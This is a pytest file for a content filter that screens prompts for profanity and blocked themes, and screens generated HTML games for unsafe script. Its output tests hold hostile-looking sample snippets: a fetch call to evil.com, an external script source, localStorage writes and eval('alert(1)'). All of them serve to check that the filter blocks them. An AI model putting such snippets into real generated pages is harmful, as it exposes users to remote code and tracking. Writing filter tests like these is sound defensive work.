from app.services.content_filter import filter_input, filter_output


def test_filter_input_clean():
    is_safe, reason = filter_input("make a fun platformer game with a cat")
    assert is_safe is True
    assert reason == "ok"


def test_filter_input_profanity():
    is_safe, reason = filter_input("make a game about shit")
    assert is_safe is False
    assert "inappropriate" in reason.lower()


def test_filter_input_violence_keywords():
    is_safe, reason = filter_input("make a game about zombie horror")
    assert is_safe is False
    # May be caught by profanity filter or keyword blocklist
    assert "inappropriate" in reason.lower() or "blocked" in reason.lower()


def test_filter_output_clean_html():
    html = (
        "<!DOCTYPE html><html><body><canvas></canvas>"
        "<script>let score=0; function update(){requestAnimationFrame(update);} update();</script>"
        "</body></html>"
    )
    is_safe, reason = filter_output(html)
    assert is_safe is True
    assert reason == "ok"


def test_filter_output_external_url():
    html = '<script src="https://cdn.example.com/lib.js"></script>'
    is_safe, reason = filter_output(html)
    assert is_safe is False
    assert "external URL" in reason


def test_filter_output_fetch_call():
    html = "<script>fetch('https://evil.com').then(r => r.text())</script>"
    is_safe, reason = filter_output(html)
    assert is_safe is False
    # Could match either "external URL" or "fetch() call"
    assert not is_safe


def test_filter_output_localstorage():
    html = "<script>localStorage.setItem('key', 'value');</script>"
    is_safe, reason = filter_output(html)
    assert is_safe is False
    assert "localStorage" in reason


def test_filter_output_eval():
    html = "<script>eval('alert(1)');</script>"
    is_safe, reason = filter_output(html)
    assert is_safe is False
    assert "eval" in reason
